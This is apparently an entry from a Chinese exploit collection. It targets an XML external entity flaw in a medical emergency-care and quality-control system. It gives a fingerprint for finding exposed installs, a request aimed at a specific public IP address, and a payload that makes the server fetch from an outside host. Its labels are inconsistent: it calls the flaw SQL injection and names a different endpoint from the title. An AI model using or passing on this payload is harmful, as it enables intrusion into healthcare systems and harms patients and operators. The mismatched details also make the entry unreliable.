# 扁鹊飞救智能急救与质控系统CreateJKDAXML实体注入漏洞

- **系统**：扁鹊飞救智能急救与质控系统CreateJKDAXML实体　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`icon_hash="-757866684"`
- **请求**：`POST /AppService/BQMedical/WebServiceForFirstaidApp.asmx/YZGH HTTP/1.1`
- **关键头**：`Host: 222.212.93.251:9000`　`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
requestXml=<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://afdrqanojb.dgrh3.cn"> %remote;]>
```
- **预期**：500　|　—